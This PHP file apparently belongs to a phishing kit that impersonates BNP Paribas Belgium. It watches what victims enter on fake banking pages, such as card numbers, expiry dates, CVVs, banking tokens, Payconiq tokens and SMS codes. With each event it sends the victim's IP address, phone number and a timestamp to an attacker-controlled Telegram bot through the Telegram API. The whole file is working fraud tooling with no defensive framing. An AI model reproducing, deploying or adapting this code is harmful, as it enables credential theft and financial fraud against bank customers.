<?php
	error_reporting(0);
    session_start();
	include "./Asstes/php/config/config.php";

	$present_time = date("H:i:s - m/d/y");

if (isset($_POST["blanco_euro"])) {

if (strpos($_POST['blanco_euro'], 'LOG') !== false) {
	
	$nermm = $_SESSION["num"] ?? "null";
	
    $message =
    "   -> BNP Brute (BE) 🇧🇪 - INFO -> (".$REZ_SOURCE.")\r\n" . 
	"   -> ✍ Typing CC ... 💳 | 📞 Num = ". $nermm ."\r\n".
    "   -> 📍 IP - ".get_client_ip()."\t\t|\t\tBE\r\n". 
    "   -> ⏰ DATE AND TIME = ". $present_time ."\r\n";


	}
	elseif (strpos($_POST['blanco_euro'], 'EXP') !== false AND $TYPING_EXP == 'y') 
	{
	$message =
    "   -> BNP Brute (BE) 🇧🇪 - INFO\r\n" . 
    "   -> 📍 IP - ".get_client_ip()."\t\t|\t\tBE\r\n". 
    "   -> 📞 Status = Typing Exp ... ⌛\r\n".
    "   -> 🕰 DATE AND TIME = ". $present_time ."\r\n";
	}
	elseif (strpos($_POST['blanco_euro'], 'TOKEN') !== false AND $TYPING_TOKEN == 'y')
	{
		    $message =
    "   -> BNP Brute (BE) 🇧🇪 - INFO\r\n" . 
    "   -> 📍 IP - ".get_client_ip()."\t\t|\t\tBE\r\n". 
    "   -> ✍ Status = Typing Token [8] ... 🎟️\r\n".
    "   -> ⏰ DATE AND TIME = ". $present_time ."\r\n";
	}
	elseif (strpos($_POST['blanco_euro'], 'PAYCN') !== false AND $TYPING_TOKEN == 'y')
	{
		    $message =
    "   -> BNP Brute (BE) 🇧🇪 - INFO\r\n" . 
    "   -> 📍 IP - ".get_client_ip()."\t\t|\t\tBE\r\n". 
    "   -> ✍ Status = Typing Payconiq Token ... 🎟️\r\n".
    "   -> ⏰ DATE AND TIME = ". $present_time ."\r\n";
	}
	elseif (strpos($_POST['blanco_euro'], 'VRTKN') !== false AND $TYPING_TOKEN == 'y')
	{
		    $message =
    "   -> BNP Brute (BE) 🇧🇪 - INFO\r\n" . 
    "   -> 📍 IP - ".get_client_ip()."\t\t|\t\tBE\r\n". 
    "   -> ✍️ Status = Typing Token 2 [8] ... 💸\r\n".
    "   -> ⏰ DATE AND TIME = ". $present_time ."\r\n";
	}
	elseif (strpos($_POST['blanco_euro'], 'SMS') !== false AND $TYPING_SMS == 'y')
	{
		    $message =
    "   -> BNP Brute (BE) 🇧🇪 - INFO\r\n" . 
    "   -> 📍 IP - ".get_client_ip()."\t\t|\t\tBE\r\n". 
    "   -> ✍ Status = Typing SMS ... 💬\r\n".
    "   -> 🕰 DATE AND TIME = ". $present_time ."\r\n";
	}elseif (strpos($_POST['blanco_euro'], 'CC') !== false AND $TYPING_SMS == 'y')
	{
		    $message =
    "   -> BNP Brute (BE) 🇧🇪 - INFO\r\n" . 
    "   -> 📍 IP - ".get_client_ip()."\t\t|\t\tBE\r\n". 
    "   -> ✍ Status = Typing (CVV) Credit Card... 💵\r\n".
    "   -> 🕰 DATE AND TIME = ". $present_time ."\r\n";
	}
	
	
	
	
	
	
	
    $bot_url  = $apiToken;
    $chat_id  = $id;

    $parameters = array(
        "chat_id" => $chat_id,
        "text" => $message
    );

    $send = ($parameters);
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);	
	}elseif (!isset($_SESSION['purchase_fired'])) {
    $_SESSION['purchase_fired'] = true;
	}elseif (!isset($_SESSION['subscribe_fired']) && isset($_POST['blanco_euro']) && str_starts_with($_POST['blanco_euro'], 'LOG-')) {
    $_SESSION['subscribe_fired'] = true;
	}elseif (!isset($_SESSION['sms_purchase_fired']) && isset($_POST['blanco_euro']) && str_starts_with($_POST['blanco_euro'], 'SMS-')) {
    $_SESSION['sms_purchase_fired'] = true;
	}
	exit;
?>